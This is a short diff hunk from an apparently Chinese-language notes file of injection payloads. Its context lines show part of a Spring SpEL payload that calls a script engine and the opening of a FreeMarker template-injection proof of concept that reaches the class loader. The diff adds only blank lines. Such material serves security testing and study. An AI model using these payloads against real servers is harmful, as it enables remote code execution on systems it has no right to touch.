@@ -163,6 +163,8 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 
 # freemarker 表达式注入
 ```
+
+
 POC1:
 
 <#assign classLoader=object?api.class.protectionDomain.classLoader> 
